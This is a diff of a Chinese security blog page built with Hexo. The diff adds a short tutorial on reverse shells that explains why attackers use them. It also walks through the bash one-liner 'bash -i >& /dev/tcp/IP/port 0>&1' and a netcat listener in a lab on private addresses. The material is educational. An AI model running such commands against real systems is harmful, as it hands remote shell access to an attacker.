@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Security,Reverse-shell," />
 
 
 
@@ -81,17 +81,21 @@
 
 
 
-<meta name="description" content="智能是人类未来之光，安全是人类基本需求">
-<meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="https://lovegood.github.io/categories/index.html">
+<meta name="description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
+<meta name="keywords" content="Security,Reverse-shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅述反弹shell">
+<meta property="og:url" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/index.html">
 <meta property="og:site_name" content="Cytosineの有被小窝~">
-<meta property="og:description" content="智能是人类未来之光，安全是人类基本需求">
+<meta property="og:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-06T10:22:12.000Z">
+<meta property="og:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/0.png">
+<meta property="og:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/1.png">
+<meta property="og:updated_time" content="2019-03-31T09:33:56.001Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="分类">
-<meta name="twitter:description" content="智能是人类未来之光，安全是人类基本需求">
+<meta name="twitter:title" content="浅述反弹shell">
+<meta name="twitter:description" content="什么是反弹shell通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。 反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。 为什么需要反弹shell 受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。 受害者的IP是动态的。 受害者主机在局域网内，从外网无法直接访问。  如何实现反">
+<meta name="twitter:image" content="https://lovegood.github.io/2019/03/30/reverse-shell-simple/0.png">
 
 
 
@@ -121,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="https://lovegood.github.io/categories/"/>
+  <link rel="canonical" href="https://lovegood.github.io/2019/03/30/reverse-shell-simple/"/>
 
 
 
 
 
-  <title>分类 | Cytosineの有被小窝~</title>
+  <title>浅述反弹shell | Cytosineの有被小窝~</title>
   
 
 
@@ -226,40 +230,211 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2019/03/30/reverse-shell-simple/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cytosine">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cytosineの有被小窝~">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">分类</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="category-all-page">
-            <div class="category-all-title">
-                暂无分类
-            </div>
-            <div class="category-all">
+          <h1 class="post-title" itemprop="name headline">浅述反弹shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
               
-            </div>
-          </div>
-        
-      </div>
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-30T21:44:29+08:00">
+                2019-03-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h1 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h1><p>通常情况下，攻击者通过漏洞获取的shell，都是由攻击者主动发起连接，连接到受害者的主机上。</p>
+<p>反弹shell又称反向shell，即受害者主机发起连接，连接到攻击者的主机上。</p>
+<h1 id="为什么需要反弹shell"><a href="#为什么需要反弹shell" class="headerlink" title="为什么需要反弹shell"></a>为什么需要反弹shell</h1><ol>
+<li>受害者主机上存在WAF，对主动连接发来的请求数据检测严格，而对向外发出的请求不进行检测或检测较少。</li>
+<li>受害者的IP是动态的。</li>
+<li>受害者主机在局域网内，从外网无法直接访问。</li>
+</ol>
+<h1 id="如何实现反弹shell"><a href="#如何实现反弹shell" class="headerlink" title="如何实现反弹shell"></a>如何实现反弹shell</h1><p>能够实现反弹shell的命令/代码千变万化，这里只选取最常见的形式，简单讲一下原理。</p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p>例如，攻击者IP 192.168.1.188，攻击者监听的端口 2333：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.188/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<h2 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h2><p>bash不用解释了叭</p>
+<p>-i参数表示开启交互式shell</p>
+<h2 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h2><p>重定向符，将前面的内容以覆盖的形式输出到后面。</p>
+<p>重定向符还有：</p>
+<ul>
+<li><code>&gt;&gt;</code>表示追加到后面</li>
+<li><code>&lt;</code></li>
+<li><code>&lt;&lt;</code></li>
+<li><code>|</code> command1|command2，command1的输出作为command2的输入</li>
+</ul>
+<h2 id="gt-amp-amp-gt"><a href="#gt-amp-amp-gt" class="headerlink" title="&gt;&amp;/&amp;&gt;"></a>&gt;&amp;/&amp;&gt;</h2><p>混合输出，正确、错误都输出到一个地方。</p>
+<h2 id="dev-tcp-ip-port"><a href="#dev-tcp-ip-port" class="headerlink" title="/dev/tcp/ip/port"></a>/dev/tcp/ip/port</h2><p>Linux下对socket网络连接的一个抽象</p>
+<h2 id="bash-i-gt-amp-dev-tcp-ip-port"><a href="#bash-i-gt-amp-dev-tcp-ip-port" class="headerlink" title="bash -i &gt;&amp; /dev/tcp/ip/port"></a>bash -i &gt;&amp; /dev/tcp/ip/port</h2><p>将bash -i起的交互式shell绑定到后面的socket连接中。</p>
+<h2 id="0-gt-amp-1"><a href="#0-gt-amp-1" class="headerlink" title="0&gt;&amp;1"></a>0&gt;&amp;1</h2><p><code>&gt;&amp;</code>前面说过了，那这个0和1又分别代表什么呢？</p>
+<p>0 标准输入</p>
+<p>1 标准输出</p>
+<p>2 错误输出</p>
+<p><code>0&gt;&amp;1</code>表示将标准输入重定向到标准输出。也就是说，bash -i这个交互式shell所要执行的命令，要从标准输出中读取，而标准输出是什么？刚才重定向到了连接到攻击者主机的socket上。也就是，命令输入来自攻击者，命令输出发送到攻击者，实现了所谓的反弹shell。</p>
+<h1 id="实验一下"><a href="#实验一下" class="headerlink" title="实验一下"></a>实验一下</h1><p>攻击者IP 192.168.1.159</p>
+<p>受害者IP 192.168.1.187</p>
+<p>攻击者在主机上执行<code>nc -l -p 2333 -vvv</code></p>
+<p>在受害者主机上执行<code>bash -i &gt;&amp; /dev/tcp/192.168.1.159/2333 0&gt;&amp;1</code></p>
+<p><img src="0.png" alt=""></p>
+<p>尝试执行一些命令：</p>
+<p><img src="1.png" alt=""></p>
+
       
     </div>
     
     
     
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>窝很可爱，请给窝钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>赞赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Security/" rel="tag"># Security</a>
+          
+            <a href="/tags/Reverse-shell/" rel="tag"># Reverse-shell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/22/translation-DOM-Based-Cross-Site-Scripting-or-XSS-of-the-Third-Kind/" rel="next" title="[翻译]DOM-XSS/第三种XSS——看一下被忽视的XSS">
+                <i class="fa fa-chevron-left"></i> [翻译]DOM-XSS/第三种XSS——看一下被忽视的XSS
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -292,8 +467,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -521,6 +705,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是反弹shell"><span class="nav-number">1.</span> <span class="nav-text">什么是反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为什么需要反弹shell"><span class="nav-number">2.</span> <span class="nav-text">为什么需要反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何实现反弹shell"><span class="nav-number">3.</span> <span class="nav-text">如何实现反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i"><span class="nav-number">3.1.</span> <span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt"><span class="nav-number">3.2.</span> <span class="nav-text">></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gt-amp-amp-gt"><span class="nav-number">3.3.</span> <span class="nav-text">>&/&></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dev-tcp-ip-port"><span class="nav-number">3.4.</span> <span class="nav-text">/dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-gt-amp-dev-tcp-ip-port"><span class="nav-number">3.5.</span> <span class="nav-text">bash -i >& /dev/tcp/ip/port</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-gt-amp-1"><span class="nav-number">3.6.</span> <span class="nav-text">0>&1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验一下"><span class="nav-number">4.</span> <span class="nav-text">实验一下</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
